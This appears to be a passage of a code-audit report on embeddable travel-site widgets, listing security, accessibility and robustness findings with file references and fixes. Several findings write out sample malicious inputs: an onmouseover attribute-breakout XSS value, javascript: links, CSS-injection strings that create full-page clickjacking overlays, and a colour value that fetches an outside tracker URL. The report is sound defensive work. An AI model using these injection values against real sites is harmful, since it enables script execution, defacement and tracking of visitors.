_All 203 verified findings, grouped by widget/area, most-severe first. Each carries its `file:line`, the failure scenario, and a suggested fix._

### `reviews`  — 10 findings (2 high, 3 medium, 5 low)

> Reviewed public/widget-reviews.js (731 lines), editor-reviews.html and demo-reviews.html. The widget is generally solid: Shadow DOM with :host{all:initial}, esc() used on most text, resolveApiBase() honours the override then script origin, fetch has try/catch + non-2xx handling, reduced-motion respected, spotlight timer self-cleans on SPA removal. But there are real problems: one hard dead-end (the badge popup's primary "See all reviews" button has no click handler and does nothing), two XSS gaps where the widget trusts config it is supposed to whitelist client-side (ctaUrl allows javascript: through esc(); colour fields are interpolated raw into style attributes and can break out of the attribute), a missing empty state (zero reviews renders a blank widget in grid/masonry/carousel/ticker), a modulo-by-zero NaN plus a perpetual 6s full re-render loop when spotlight has no 5-star reviews, plus accessibility gaps on icon-only controls. Editor and demo pages use inline handlers, which is the established editor-shell pattern on the platform's own origin, so not flagged as widget CSP violations.

- **🟠 High · security** — ctaUrl accepts javascript: URLs — esc() does not sanitise the scheme
  - `public/widget-reviews.js:471 (href), default at 398; sink also 511/538 (img src)`
  - **Breaks:** A widget config whose ctaUrl is `javascript:...` renders a 'Write a Review' link that runs attacker script in the customer page context when a visitor clicks it. Server sanitisation does not block it (colours/URLs are untouched by sanitiseConfig).
  - **Fix:** Before rendering, validate ctaUrl against an allowlist of schemes (http, https, mailto, and same-page '#'); replace anything else with the '#' default. Apply the same check to photoUrl.
- **🟠 High · security** — Colour/config values interpolated raw into style attributes (attribute-breakout XSS)
  - `public/widget-reviews.js:413 (root style), 488 (a.color)`
  - **Breaks:** A config with brandColor `#000" onmouseover="alert(1)` (or a crafted aiHighlights[].color) breaks out of the style attribute and runs arbitrary JS in the host page on mouseover. Even benignly, a colour containing a quote corrupts the root tag and can blank the whole widget.
  - **Fix:** Whitelist every colour against /^#([0-9a-f]{3,8})$/i (or a named-colour set) and coerce borderRadius with Number() + clamp before interpolation; substitute the default on any mismatch.
- **🟡 Medium · dead-end** — Badge popup 'See all reviews' button is a dead end (no click handler)
  - `public/widget-reviews.js:606 (rendered), 627-699 (_bind)`
  - **Breaks:** A visitor opens the trust-badge popup and clicks the prominent blue 'See all reviews' button. Nothing happens — no navigation, no expansion, no scroll. They can still close the popup, so they are not trapped, but the headline action of the popup is completely non-functional.
  - **Fix:** Wire .tgr-badge-allbtn in _bind() to a concrete action — open a validated platform-reviews URL (a whitelisted config field) in a new tab, or switch this.c.layout to a full layout and re-render. If purely decorative, drop it or make it a non-interactive element.
- **🟡 Medium · ux-ui** — No empty state — zero reviews renders a blank widget
  - `public/widget-reviews.js:561-563 (_grid), 566-575 (_masonry), 578-583 (_carousel), 610-617 (_ticker); default reviews:[] at 405`
  - **Breaks:** A newly created widget, or one whose config load returns no reviews (or a tag filter that matches nothing), shows the header and AI insight cards above a completely empty review block — it reads as broken.
  - **Fix:** Add a shared empty-state branch (mirroring _spotlight's noSpotlight message) returned by every layout whenever the filtered list is empty.
- **🟡 Medium · accessibility** — Icon-only carousel/dot/close controls and star ratings lack accessible names; carousel buttons have no visible focus
  - `public/widget-reviews.js:580/582 (carousel btns), 594 (dots), 604 (badge close), 170-178 (stars), 297-298 (opacity:0 CSS)`
  - **Breaks:** A keyboard/screen-reader visitor cannot tell what the carousel arrows, dots or close button do, cannot perceive any review's star rating, and gets no visible focus indicator when tabbing to the carousel arrows.
  - **Fix:** Add aria-label to the carousel, dot and close buttons; wrap stars() output with role="img" + aria-label like '4 out of 5 stars'; and reveal .tgr-carousel-btn on :focus-within (not only :hover).
- **⚪ Low · robustness** — Spotlight with no 5-star reviews: modulo-by-zero NaN and endless 6s re-render loop
  - `public/widget-reviews.js:653-662, 587-589`
  - **Breaks:** A spotlight widget populated only with 4-star reviews (or ratings as strings) shows 'No 5-star reviews to spotlight' but silently rebuilds its shadow DOM every 6 seconds indefinitely, wasting CPU/battery on the visitor's device.
  - **Fix:** Only start the interval when fives.length > 1; skip the increment when length is 0 or 1. Coerce rating with Number() before the ===5 comparison so string ratings count.
- **⚪ Low · robustness** — No double-init guard on auto-init
  - `public/widget-reviews.js:706-724 (init), 380 (attachShadow)`
  - **Breaks:** A customer pastes the widget script twice (a common copy-paste mistake) and gets a console error per reviews container on the second init pass instead of the intended silent skip.
  - **Fix:** Set and check a flag (e.g. el.__tgReviewsInit) before constructing, and skip already-initialised containers.
- **⚪ Low · robustness** — update() from spotlight to another layout leaks the auto-rotate interval
  - `public/widget-reviews.js:701 (update), 653-662 (timer), 702 (destroy)`
  - **Breaks:** A consumer calling widget.update({layout:'grid'}) after a spotlight config leaves a zombie timer re-rendering the grid every 6 seconds. The editor/demo sidestep it by creating fresh instances, so it is latent, but the public update() API is affected.
  - **Fix:** Clear this._spotTimer unconditionally at the top of _render() (or in update()) rather than only inside the spotlight branch.
- **⚪ Low · robustness** — esc()-before-slice truncates HTML entities and mis-counts characters
  - `public/widget-reviews.js:513, 521, 529, 605, 615 (vs correct 543)`
  - **Breaks:** A review containing '&', '<' or a quote near the cut point renders a fragment like '&am' or '&quo' in the photohero/quote/compact/badge/ticker snippets, with visibly shorter-than-intended text.
  - **Fix:** Slice the raw text first, then escape: `esc(r.text.slice(0,N))`, matching line 543.
- **⚪ Low · robustness** — Ticker crashes and avatars get NaN colour when a review author is missing
  - `public/widget-reviews.js:615 (author.split), 367 (avatarColor)`
  - **Breaks:** A single imported/AI-seeded review object lacking an `author` field throws a TypeError in the ticker layout, blanking the whole ticker; in other layouts such a review shows an avatar with no background colour.
  - **Fix:** Default author to a placeholder (e.g. 'Anonymous') at ingest, and guard split()/charCodeAt() against empty strings (fall back to a fixed colour when the name is empty).

### `countdown`  — 6 findings (1 high, 2 medium, 3 low)

> The countdown widget is largely well-built: it is CSP-clean (no inline handlers, no injected script, all text via textContent, CTA URLs run through safeUrl, localStorage wrapped in try/catch, double-init guard present, resolveApiBase honours window.__TG_WIDGET_API__ then script origin, and setInterval is cleaned up on disconnect). The editor and demo are also clean (template innerHTML uses only hardcoded constants; the demo has a helpful load-failure state). The findings below are real but mostly moderate: the most impactful is that a transient config-fetch failure silently renders a live sale as "offer ended". No unescapable modal or hard circle-of-doom was found.

- **🟠 High · robustness** — Config-fetch failure makes a live countdown display "This offer has now ended."
  - `public/widget-countdown.js:1301-1310, 1323-1324, 876-897, 939-944`
  - **Breaks:** The widget-config API has a brief 502, or the visitor has a flaky connection on first paint. fetchConfig catches it and returns null; the widget builds with defaults (targetDate null). isExpired computes true and the default 'message' behaviour renders 'This offer has now ended.' on a sale that is actually still live, killing the conversion and misinforming the visitor until they reload.
  - **Fix:** Distinguish 'config failed to load' from 'genuinely expired'. Have fetchConfig signal failure distinctly (e.g. throw or return a sentinel) and, on failure, render nothing (hidden) or a neutral state with a backoff retry rather than falling through to the expired copy. At minimum, when targetDate was never provided at all, render nothing instead of the 'offer ended' message.
- **🟡 Medium · ux-ui** — Sticky-top/bottom banner overlays host page content with no offset
  - `public/widget-countdown.js:447-458, 962-971`
  - **Breaks:** An author picks Banner + sticky-top on a site whose logo and primary nav sit at the very top. The countdown bar covers the nav; visitors cannot see or click the site's own navigation while the bar is present. If not marked dismissible, this lasts the entire visit.
  - **Fix:** When a sticky position is applied, measure the rendered bar height and push host content by setting body padding-top/bottom on the host document (cleaned up on dismiss/destroy), or document clearly that sticky bars require the author to reserve space in their own layout.
- **🟡 Medium · robustness** — Repeating countdown computes the target in the visitor's local timezone, ignoring configured timezone
  - `public/widget-countdown.js:159-177, 684`
  - **Breaks:** A UK operator enables a repeating weekly Friday 17:00 deadline. A visitor in New York gets a target of 17:00 America/New_York (22:00 UK) — five hours off — so the timer, urgency threshold and roll-over all fire at the wrong moment for that visitor.
  - **Fix:** Compute repeating occurrences against the configured timezone (e.g. derive the zone's current offset via Intl.DateTimeFormat parts) instead of local time, or make the editor copy state explicitly that repeating deadlines are visitor-local so authors do not assume a single global instant.
- **⚪ Low · usability** — Persisted dismissal hides the widget even after the author changes away from a sticky banner layout
  - `public/widget-countdown.js:765-770, 837`
  - **Breaks:** Visitor dismisses the sticky banner (flag stored under the widget id). Author edits the same widget to a Card layout. On the visitor's next visit the card never renders because the old dismissal flag still triggers the early return.
  - **Fix:** Only honour the dismissal when the current layout is Banner with a sticky+dismissible position, or namespace the stored key by layout/position so a layout change naturally clears the suppression.
- **⚪ Low · ux-ui** — Final-minute progress ring is empty at the 60s boundary instead of full
  - `public/widget-countdown.js:1276-1279`
  - **Breaks:** In the final minute the seconds ring renders empty at exactly 60s, jumps to near-full at 59s, then drains smoothly — a brief visual glitch at the start of the most attention-grabbing moment.
  - **Fix:** Base the fill on total remaining ms within the final minute rather than the seconds digit alone, e.g. offset = ((60000 - r.total) / 60000) * 289, which gives 0 (full) at 60s and 289 (empty) at 0s with no boundary jump.
- **⚪ Low · security** — Config colour strings are written into CSS custom properties without a whitelist
  - `public/widget-countdown.js:848-855, 868-870`
  - **Breaks:** An author (or a tampered saved config) sets colours.bg to `url(https://tracker/x.png)`; --tgcd-bg feeds `background: var(--tgcd-bg)` so every visitor's widget background fetches that external URL, or a typo'd colour value leaves cells unstyled with no clean fallback.
  - **Fix:** Validate colour values against a hex / rgb(a) / named-colour / `transparent` whitelist (reuse the hexToRgb-style pattern) before setProperty, and reject any value containing url(), image(), or expression(). Do the same lightweight sanitisation for fontFamily.

### `offer-builder`  — 6 findings (1 high, 2 medium, 3 low)

> The offer-builder widget is largely well-built: it esc()s text, whitelists photo URLs through safePhotoUrl() before interpolating into style attributes, has a proper double-init guard, uses Shadow DOM with :host{all:initial}, wraps translate/save fetches in error handling with clear user-facing messages, and re-enables buttons in finally/catch so there are no stuck spinners in normal flow. The standout real problem is that a transient save failure destroys the entire filled-in form (data loss with no recovery path). Secondary issues: the widget ignores the repo's resolveApiBase convention and hard-codes a relative /api base (breaks the documented data-tg-id embed on any customer origin); the public demo exposes a Translate action that can only ever 401; the editor's empty-state primary CTA uses an inline onclick (CSP violation); and the tag chips lack aria state. No XSS sinks, no injected scripts, no eval, and no unescapable modal/focus traps were found.

- **🟠 High · dead-end** — A transient save failure wipes the whole filled-in offer form with no way to recover it
  - `public/widget-offer-builder.js:1102, 1105-1123`
  - **Breaks:** An agent spends several minutes building an offer (AI draft, photos, five translated languages), clicks Save, and the session cookie has just expired (401) or the network blips. saveEndpoint returns non-2xx, the catch fires, and the form is instantly replaced by a red 'Could not save the offer' panel. 'Create another offer' yields an empty form. All typed input is gone; only a copyable JSON blob of the offer remains.
  - **Fix:** On save failure do NOT swap out the form. Keep it intact, re-enable the .ob-submit button (reset its label from 'Saving…'), and surface the error inline above the .ob-actions row so the agent can re-authenticate and retry without losing input. Only call _success() (which tears down to the panel) when the save genuinely succeeds.
- **🟡 Medium · robustness** — Relative /api base ignores resolveApiBase convention — config load and endpoints break on any non-Travelgenix origin
  - `public/widget-offer-builder.js:25 (used at 1139); defaults at 405, 412, 431`
  - **Breaks:** If the offer-builder is embedded on a customer origin (e.g. https://someagency.co.uk) via data-tg-widget + data-tg-id, the auto-init path fetches https://someagency.co.uk/api/widget-config?id=... which 404s. loadConfigFromApi catches, logs, and returns null; init() hits `continue` (1164) and the widget silently never renders — a blank container with no visible error. Same-origin dashboard usage is unaffected.
  - **Fix:** Add a resolveApiBase() that returns window.__TG_WIDGET_API__ or the origin of the widget's own script (document.currentScript / a captured script.src), and prefix API_BASE plus the default save/translate/upload endpoints with it, matching the rest of the suite.
- **🟡 Medium · ux-ui** — Public demo exposes a Translate action that can only ever fail with a 401
  - `public/demo-offer-builder.html:146-159 (buildConfig omits showLanguages:false)`
  - **Breaks:** A demo visitor toggles 'French' on, clicks 'Translate for my audience', and after the busy spinner gets 'Your session has expired. Please sign in again, then retry.' — confusing because they were never signed in and the demo has no sign-in. The feature is a guaranteed dead-end.
  - **Fix:** Add showLanguages: false to buildConfig() in demo-offer-builder.html (as the widget comment at line 428-430 already recommends), or point translateEndpoint at a mock that returns a canned i18n payload the way aiMock does for AI drafts.
- **⚪ Low · usability _(plausible)_** — Empty-state primary CTA uses an inline onclick handler (convention breach; dead only under a stricter CSP than is deployed)
  - `public/editor-offer-builder.html:473`
  - **Breaks:** Only under a hypothetical future tightening of the editor-page CSP to script-src 'self' (no 'unsafe-inline') would the inline handler be blocked and 'Create your first offer' do nothing. Under today's headers it functions, and the top-bar 'New offer' button (btn-new) is visible in the empty state as a working fallback regardless.
  - **Fix:** Give the empty-state button an id and add a branch to the existing #offersList click delegation (602-608), e.g. `if (e.target.closest('#btn-first-offer')) { openForm(null); return; }`, removing the inline onclick to satisfy the convention and stay robust if the CSP is ever tightened.
- **⚪ Low · accessibility** — Tag chips convey selection state only via a CSS class — no aria-pressed for assistive tech
  - `public/widget-offer-builder.js:575 (render), 668 (toggle handler)`
  - **Breaks:** A screen-reader user tabs to the 'Family friendly' tag and activates it, hearing no state change, and cannot tell which tags are currently selected on the offer.
  - **Fix:** Render each chip with role="button" aria-pressed="false" (or role=switch) at line 575 and update aria-pressed alongside the class toggle at line 668, mirroring the language-toggle pattern at 935-936/948-954.
- **⚪ Low · security** — Success-panel 'Open' link is escaped but not scheme-validated against javascript:
  - `public/widget-offer-builder.js:1109-1113`
  - **Breaks:** If the widget is instantiated with a raw config where offerBaseUrl is a javascript: URI (bypassing the editor's normBase) and the server returns an id but no url, the composed link becomes `javascript:…` and the 'Open' button executes it on click — an owner-self-XSS.
  - **Fix:** Run the composed link through a scheme whitelist (allow only http/https and relative/absolute-path URLs, reject javascript:/data:/vbscript:) before interpolating it into the href, consistent with the existing safePhotoUrl guard.

### `offer-page`  — 6 findings (1 high, 2 medium, 3 low)

> The offer-page widget is largely well-built: CSP-clean (no inline handlers, no injected script, no eval), text runs through esc(), URLs pass a safeUrl() whitelist that blocks javascript:, storage is not used, there is a double-init guard, timers/observers/listeners are torn down in destroy(), reduced-motion is honoured, and the enquiry flow degrades gracefully (fire-and-forget fetch never blocks the thank-you). No true circle-of-doom exists: the lightbox is escapable three ways and the success state is a legitimate terminal. The one high-impact defect is a convention violation that breaks the primary remote-config path on customer sites (relative API_BASE), which strands the visitor on a permanently blank container with no visible error or loading state. The remaining items are a lightbox accessibility gap and several low-severity robustness/UX edges.

- **🟠 High · dead-end** — Remote config fetch uses a relative /api path, so remote-config embeds render blank on any customer site
  - `public/widget-offer-page.js:33, :1279, :1298-1300`
  - **Breaks:** An agency embeds `<div data-tg-widget="offer-page" data-tg-id="tgw_...">` on their own domain (no inline data-tg-config). fetch('/api/widget-config?id=...') hits the CUSTOMER origin, returns 404/HTML, res.ok is false, loadConfigFromApi returns null, init() hits `continue` and never constructs the widget. Container stays empty with only a console.error. Inline data-tg-config embeds and same-origin demo pages are unaffected, which is why it can pass local testing yet fail in the field.
  - **Fix:** Resolve the config base like the enquiry endpoint: `const API_BASE = (window.__TG_WIDGET_API__ || SCRIPT_BASE + 'api') + '/widget-config'`. Never fetch config from a relative path. Add a widget test asserting the fetched URL is absolute against the script origin.
- **🟡 Medium · ux-ui** — No visible loading or error state during/after remote config fetch
  - `public/widget-offer-page.js:1288-1301, :1284`
  - **Breaks:** Even after the API-base bug is fixed, a transient config-endpoint outage or flaky visitor connection yields res.ok false or a thrown fetch; loadConfigFromApi returns null, init() continues, and the container renders nothing. The visitor cannot tell whether it is loading, broken or empty, and the only recovery is a full page reload.
  - **Fix:** Write a lightweight loading placeholder into the container before the fetch, and on null config render a minimal fallback/error message with a retry affordance instead of leaving the container empty.
- **🟡 Medium · accessibility** — Lightbox controls and image have no accessible names or dialog semantics
  - `public/widget-offer-page.js:1029-1032, :1181-1208`
  - **Breaks:** A screen-reader user opening a gallery photo hears three bare "button" controls with no name and an image announced as nothing (empty alt). A keyboard user's focus stays on the now-obscured background gallery button behind the full-screen overlay; Tab continues through the page behind the lightbox rather than its controls.
  - **Fix:** Add localised aria-labels (via t()) to close/prev/next, give the overlay role="dialog" aria-modal="true", set a meaningful alt on the image (offer title + photo index), move focus to the close button on open, and restore focus to the originating gallery button on close.
- **⚪ Low · robustness** — Countdown interval keeps firing forever after the deadline passes
  - `public/widget-offer-page.js:1168-1178`
  - **Breaks:** A visitor lands on an offer whose book-by date is already past, or reaches it while the tab stays open. A 60-second interval runs for the whole session doing nothing useful. Bounded per page; the interval IS cleared on destroy()/update() (1269) so it does not leak across teardown.
  - **Fix:** When diff <= 0, clear the interval (store the timer id and clearInterval it inside tick, or only start the timer when target is in the future).
- **⚪ Low · usability** — Gallery shows at most 5 photos but the lightbox cycles the full image array
  - `public/widget-offer-page.js:950, :1187-1195`
  - **Breaks:** An offer with 9 images shows 5 thumbnails; a visitor opens a thumbnail and presses next repeatedly, cycling through 4 photos never shown as thumbnails, with no counter for position or remaining count. Mildly confusing but not broken.
  - **Fix:** Drive the lightbox from the same sliced set the gallery renders, or surface all images in the grid and add a visible position indicator (e.g. '3 / 9').
- **⚪ Low · security** — safeUrl regex is not end-anchored and CSS url() is unquoted, allowing author-supplied image URLs to inject extra CSS onto hero/gallery elements
  - `public/widget-offer-page.js:317-322, :924, :950`
  - **Breaks:** An offer image (author config or an untrusted offer feed) set to `https://x/a.jpg);position:fixed;inset:0;z-index:99999;background:red` passes safeUrl (starts with https://) and yields `style="background-image:url(https://x/a.jpg);position:fixed;inset:0;z-index:99999;background:red)"`, turning the hero into a full-page fixed overlay — visual defacement / clickjacking surface. The surrounding HTML attribute cannot be broken out of (esc converts " to &quot;) so no script runs; the injection is confined to CSS declarations on that one element, hence low.
  - **Fix:** End-anchor/validate the URL (reject characters that break out of url() such as ) ; and whitespace) and wrap the value in escaped quotes inside url(), e.g. `url(\"...\")` with esc also handling the quote character.

### `events`  — 5 findings (1 high, 1 medium, 3 low)

> The events widget is broadly solid: Shadow DOM with :host{all:initial}, thorough esc() on all text, safeUrl/safeImageUrl whitelisting, safeColorE/safeFontStackE validation, clamped numbers, strict date parsing, double-init guard, resolveApiBase honouring window flags then script origin (both API_BASE and EVENTS_API), storage-free, no eval/injected script/inline handlers. Fetch paths handle non-2xx and malformed JSON. I found one genuine dead-end (the month-view "+N more" control never reveals the hidden events), a couple of accessibility gaps around the modal, a misleading "Do nothing" click mode, and a low-severity CSS-injection via unescaped ")" in image url(...). No circle-of-doom: the modal is escapable three ways and there are no reload/retry loops.

- **🟠 High · dead-end** — Month-view "+N more" is a dead end — hidden events are unreachable
  - `public/widget-events.js:1721-1724 (button rendered 1549, bound 1635-1647, pills 1532-1548)`
  - **Breaks:** A date has 5 events. Month view shows pills for events 1-3 and a '+2 more' button. The visitor clicks '+2 more' expecting the two hidden events; the widget instead opens the detail modal for event 1 (already visible). Events 4 and 5 are permanently unreachable in month view.
  - **Fix:** Implement _openModalList to render a real day list (all events for that day, each row clickable to its own detail modal) instead of opening events[0]. As a stopgap, open a single modal that lists every event for that day with links. The stub comment at line 1722 already anticipates this.
- **🟡 Medium · accessibility** — Detail modal has no focus management or focus trap
  - `public/widget-events.js:1666-1719`
  - **Breaks:** A keyboard-only visitor activates an event; the modal animates in but focus stays on the list item behind the overlay. Pressing Tab moves through host-page controls hidden under the modal, not the modal's Close button or 'Find out more' CTA. Escape does dismiss it, but reaching the CTA by keyboard is effectively impossible.
  - **Fix:** On open, move focus to the close button (or the dialog card given tabindex=-1); add an id to the .tge-modal-name h3 and reference it via aria-labelledby; trap Tab within the card while open; and restore focus to the triggering element in _closeModal.
- **⚪ Low · ux-ui** — "Do nothing" click mode still renders events as interactive buttons
  - `public/widget-events.js:1662, 1467, 1544, 1584; editor-events.html:1092`
  - **Breaks:** Author picks 'Do nothing'. A visitor sees the hover arrow slide and the card lift on hover, clicks an event, and nothing happens — a silent dead control that reads as broken.
  - **Fix:** When cfg.onClick === 'none', render event rows/cards as non-interactive elements (div/article), or at minimum drop role=button/tabindex, set cursor:default, and remove the hover arrow/lift so they don't advertise interactivity.
- **⚪ Low · security** — CSS injection via unescaped ) and ; in image url()
  - `public/widget-events.js:1581 and 1680`
  - **Breaks:** An author-supplied (or compromised curated-feed) event provides image = 'https://a.com/p);position:fixed;inset:0;z-index:2147483647;background:#000'. The card/modal image div becomes a full-viewport opaque overlay (defacement / clickjacking), or triggers a background-image request to an attacker origin, with no quote break-out needed because ')' and ';' survive esc().
  - **Fix:** In safeImageUrl, reject or percent-encode '(', ')' and ';' in the resolved href (return '' if present), or quote the value: `url("...")` with encodeURI applied and embedded quotes rejected. Apply defence-in-depth server-side in the curated feed too.
- **⚪ Low · robustness** — Remote-config load failure leaves a silently blank widget
  - `public/widget-events.js:1782-1792`
  - **Breaks:** The config endpoint is briefly down or the data-tg-id is stale. The embedding page renders a blank region with no message; the visitor has no indication anything was meant to be there and no way to recover short of reloading once the endpoint recovers.
  - **Fix:** On config-fetch failure, still construct the widget shell with the error empty-state (reuse _renderEmpty/emptyError) or render a minimal inline fallback message, so the failure is visible and consistent with the curated-fetch behaviour.

### `offer-card`  — 5 findings (1 high, 3 medium, 1 low)

> Reviewed public/widget-offer-card.js (681 lines) and public/demo-offer-card.html (193 lines); no editor-offer-card.html exists. The widget is well-structured (Shadow DOM with :host{all:initial}, esc() on text, safeUrl() gate, double-init guard, i18n, reduced-motion, scheduling window) and free of classic XSS-into-text sinks. But it has one HIGH functional bug that breaks its primary embed path on customer sites, plus a real CSS-injection gap in the image url() sink, an invalid nested-anchor structure, and a dead-end CTA. Findings ranked by real user impact below.

- **🟠 High · robustness** — Config fetch uses a relative /api path, so remote-config embeds fail on every customer site
  - `public/widget-offer-card.js:31,640`
  - **Breaks:** A travel agent embeds <div data-tg-widget="offer-card" data-tg-id="tgw_123"> plus the script on shop.example.com. loadConfigFromApi fetches https://shop.example.com/api/widget-config?id=tgw_123, which 404s (or CORS-fails). The catch at line 645 logs and returns null, init()'s `if (!config) continue` (line 664) skips the container, and the card silently never renders. Only inline data-tg-config or data-tg-offer embeds work off-origin.
  - **Fix:** Add a resolveApiBase() that returns window.__TG_WIDGET_API__ if set, else the origin derived from document.currentScript.src (captured at top-level before the IIFE's async code runs), and build API_BASE = resolveApiBase() + '/api/widget-config'. Copy the pattern from widget-hours.js.
- **🟡 Medium · security** — Offer image URL is injected into a style url() where esc() cannot neutralise CSS breakout characters
  - `public/widget-offer-card.js:486,529`
  - **Breaks:** An offer whose image field is '/x);position:fixed;inset:0;width:100vw;height:100vh;z-index:99999;background:#fff' passes safeUrl (starts with '/') and survives esc() untouched, rendering style="background-image:url(/x);position:fixed;inset:0;...)". The .tgoc-img (or .tgoc-bimg) element escapes its card and covers the host viewport as a fixed overlay, enabling defacement or clickjacking. Because the image field is author/config controlled rather than visitor-supplied, this is a convention-bypass / stored-content vector rather than a visitor-driven attack.
  - **Fix:** In safeUrl() reject any value containing ( ) ; or whitespace, or apply CSS.escape/encodeURI to the URL and wrap it in single quotes inside url(). Better, set background-image via element.style.setProperty on a real DOM node instead of string-concatenating into a style attribute.
- **🟡 Medium · accessibility** — Whole card is an <a> that wraps the CTA <a>, producing nested interactive anchors
  - `public/widget-offer-card.js:520-524,613-622`
  - **Breaks:** A keyboard or screen-reader user tabs into a card that has a destination. AT encounters a link nested in a link: some readers expose only the outer link, some duplicate the target, some drop the CTA. Tab order and click-target semantics between the card link and the CTA link become ambiguous.
  - **Fix:** Make exactly one element the link. Either keep the card as <a> and render the CTA as a visual-only styled span (no href), or keep the card a <div> and let the CTA <a> be the sole link. Never nest anchors.
- **🟡 Medium · dead-end** — CTA button links to '#' (dead end) when the offer has no ctaHref and no offerPage
  - `public/widget-offer-card.js:363-384,521`
  - **Breaks:** An author sets an offer (title, price, image) but forgets ctaHref and offerPage. The card shows a styled 'View deal' button. A visitor clicks it and the browser navigates to '#', jumping the page to the top with no other effect. The primary control is a silent dead end.
  - **Fix:** When _linkHref is empty, omit the CTA entirely or render it as a visibly disabled element (no href, aria-disabled="true", muted styling) rather than emitting href="#".
- **⚪ Low · security** — brandColor and accentColor are applied to CSS variables without whitelisting
  - `public/widget-offer-card.js:342-343,591-595`
  - **Breaks:** A malformed config value such as accentColor: 'notacolor' or 'var(--x) !important; broken' is passed to setProperty, which the CSSOM rejects as an invalid declaration. The CTA and accent tokens fall back to defaults or lose colour with no feedback to the author. No injection occurs.
  - **Fix:** Validate brandColor/accentColor against a colour whitelist (e.g. /^#([0-9a-f]{3}|[0-9a-f]{6})$/i plus a small set of rgb()/hsl()/named tokens) before setProperty, discarding non-matching values, mirroring the other widgets.

### `prism`  — 5 findings (1 high, 4 low)

> The prism widget script is clean and well-hardened: all config values are whitelisted (colours via safeColor, fonts via an allow-list, shadows via a fixed map), numbers are clamped, safeUrl blocks javascript:/vbscript:/non-image data:, every string is esc()'d before going into innerHTML, it uses Shadow DOM with :host{all:initial}, and it self-terminates its ResizeObserver/listeners in destroy(). No XSS sinks, no eval/injected script, no unescaped interpolation, and no in-widget dead ends or unescapable states (the only interactive controls are slice links, which are disabled in previewMode). The one high-impact issue is an editor↔widget disagreement on URL validation: the editor auto-prepends https:// to bare domains and shows a green success confirmation, but stores the raw value, which the widget's stricter safeUrl then rejects — producing a published photo slice that looks linked in the editor but is dead for visitors. The remaining findings are low-severity (a demo-only observer leak, an editor image-note that never warns about scheme-less URLs, and an incomplete ARIA slider on the focal picker).

- **🟠 High · dead-end** — Editor confirms a working link for bare-domain hrefs, but the published slice is dead
  - `public/editor-prism.html:537 (input handler stores raw value), :293-300 (safeUrlState) , :412-418 (updateHrefNote); public/widget-prism.js:43-50 (safeUrl), :332,339-343 (_slice)`
  - **Breaks:** An agency user types 'example.com' into a destination's Links-to field, sees the reassuring green '✓ Links to https://example.com', saves and publishes. On the live site that destination photo has no anchor element at all, so visitors clicking it get nothing — a silently dead link the editor certified as working.
  - **Fix:** Store the normalised URL, not the raw string. In the line 537 handler run the value through safeUrlState() and persist res.url when state==='ok' (e.g. C.items[selected].href = safeUrlState(e.target.value).url). Additionally/alternatively teach the widget's safeUrl() to repair bare domains so the two validators agree. The stored value must be the same one the note promises.
- **⚪ Low · robustness** — Demo double-inits the mount, orphaning an auto-init widget instance and its ResizeObserver
  - `public/demo-prism.html:54 (mount carries data-tg-widget), :78-87 (rebuild), :104; public/widget-prism.js:439-455 (initOne/init), :384 (ResizeObserver)`
  - **Breaks:** On page load two constructions occur on #mount; the orphaned instance's observer and any font-ready _refit callback keep stale references. Visually the demo is correct but there is redundant layout work and a leaked observer. Demo-only, so real impact is negligible.
  - **Fix:** Give the demo mount an id-only hook without data-tg-widget so auto-init skips it, or have the demo call initOne's guard by setting mount.__tgInited before its first rebuild(), or destroy the auto-init instance first. Simplest: drop data-tg-widget="prism" from #mount since the demo instantiates manually.
- **⚪ Low · usability** — Editor image note never warns that a scheme-less photo URL will be dropped by the widget
  - `public/editor-prism.html:419-424 (updateImageNote), :402-407 (syncFocal), :529-535 (d-image handler); public/widget-prism.js:43-50 (safeUrl), :331,336 (_slice)`
  - **Breaks:** A user pastes 'photo.jpg' or 'images/hero.jpg' into the Photo URL field. The editor shows no warning and the focal box may load it against the editor domain, so the user believes the photo is set. The published widget silently shows a coloured fallback gradient with no explanation.
  - **Fix:** Mirror safeUrl()'s acceptance rule in updateImageNote(): if a non-empty value does not start with http(s):, /, #, . or data:image, warn that the photo needs a full URL or a path starting with /. Optionally normalise scheme-less domains as is done for hrefs.
- **⚪ Low · accessibility** — Focal-point picker uses role="slider" with no value ARIA for a 2D control
  - `public/editor-prism.html:169-171 (role=slider, no value attrs), :439-447 (2-axis keydown handler)`
  - **Breaks:** A keyboard/screen-reader user tabs to the focal picker and arrows around, hearing only 'slider' with no position read-out, so they cannot tell what the control does or confirm any adjustment.
  - **Fix:** Either replace role="slider" with role="group" plus a descriptive aria-label and an aria-live status region announcing e.g. 'focal point 50% across, 40% down' on each move, or split into two labelled sliders (horizontal/vertical) each with aria-valuenow/min/max/valuetext updated in the keydown handler.
- **⚪ Low · robustness** — mergeConfig does not guard against non-object entries in items[]
  - `public/widget-prism.js:284,292 (mergeConfig), :330-333 (_slice), :445,449,450 (init try/catch)`
  - **Breaks:** A customer embed uses data-tg-config='{"items":[null]}'. JSON.parse succeeds, mergeConfig keeps [null], _slice throws on null.image, the init try/catch swallows it, and the container stays a blank hero band with no fallback.
  - **Fix:** In mergeConfig filter items to plain objects before slicing (items.filter(function(x){return x && typeof x==='object';})) and fall back to DEFAULTS.items if the result is empty, so one bad entry cannot blank the whole widget.

### `carousel`  — 4 findings (1 high, 1 medium, 2 low)

> The carousel widget is largely well-built: config is sanitised (esc/safeColor/safeFont/clampNum/safeUrl/safeImg), Shadow DOM with :host{all:initial}, resolveBase honours the API override and script origin, storage is not used, double-init guard is present, fetch is wrapped in try/catch with graceful empty-state fallback, and reduced-motion is respected. No XSS or CSP problems were found. The one serious issue is a re-entrancy bug in the multi-step advance timer that can leak an unstoppable interval (a genuine circle of doom). Two accessibility issues round out the findings: off-screen slide buttons stay keyboard-focusable, and the CTA anchor is nested inside a button. Everything else is clean.

- **🟠 High · circle-of-doom** — Re-entrant _advanceBy leaks an orphaned interval, causing an unstoppable runaway carousel
  - `public/widget-carousel.js:745-755, teardown 768/783`
  - **Breaks:** On a 4+ slide carousel a visitor clicks a far dot (steps>=2, starts interval A), then ~1s later clicks another far dot (steps>=2) before A drains. The second call overwrites this._t2 with interval B, orphaning A. A keeps firing every 180ms and calls _next() whenever !animating, so the carousel auto-advances forever. _stop(), pause-on-hover, off-screen/visibility handlers only clear this.timer, and destroy() only clears this._t2 (=B), so nothing short of a page reload stops A.
  - **Fix:** Clear any existing stepper before starting a new one (`if (this._t2) clearInterval(this._t2);` at the top of _advanceBy), AND have the interval capture its own id in a local const and clearInterval(thatLocalId) in the termination branch so an interval can only ever clear itself. Also null out this._t2 after clearing. Optionally guard reentrancy so a stepper in progress ignores new advance requests.
